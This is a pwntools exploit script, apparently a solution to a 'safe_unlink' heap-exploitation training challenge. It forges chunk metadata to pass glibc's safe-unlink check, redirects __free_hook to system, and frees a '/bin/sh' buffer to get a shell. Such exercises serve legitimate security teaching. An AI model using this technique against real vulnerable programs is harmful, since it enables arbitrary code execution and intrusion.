#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("safe_unlink")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Select the "free" option; send index.
def free(index):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# Print the address of m_array, where the program stores pointers to its allocated chunks.
info(f"m_array @ 0x{elf.sym.m_array:02x}")

# Request 2 small chunks.
chunk_A = malloc(0x88)
chunk_B = malloc(0x88)

# Prepare fake chunk metadata.
fd = elf.sym.m_array-24
bk = elf.sym.m_array-16
prev_size = 0x80
fake_size = 0x90
edit(chunk_A, p64(0)+p64(0x80)+ p64(fd) + p64(bk) + p8(0)*0x60 + p64(prev_size) + p64(fake_size))

# # Prepare consolidation
free(chunk_B)

# # Overwrite target
edit(0,p64(0)*3 +p64(libc.sym.__free_hook - 8 ))
edit(0, b'/bin/sh\0'+ p64(libc.sym.system))
free(0)

# =============================================================================

io.interactive()
